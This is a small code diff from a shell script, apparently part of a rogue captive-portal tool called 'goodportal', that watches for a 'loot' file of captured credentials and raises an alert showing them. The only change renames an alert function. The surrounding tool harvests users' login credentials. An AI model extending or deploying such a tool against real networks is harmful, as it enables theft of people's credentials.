@@ -82,7 +82,7 @@ while true; do
         if [ -f "$loot_file" ]; then
             > "$CREDENTIALS_FILE"
             logger -t goodportal-whitelist "Saved credentials to: $loot_file"
-            ALERT_RINGTONE true "goodportal captured new credentials!\n $(cat $loot_file)"
+            ALERT true "goodportal captured new credentials!\n $(cat $loot_file)"
         fi
     fi
     
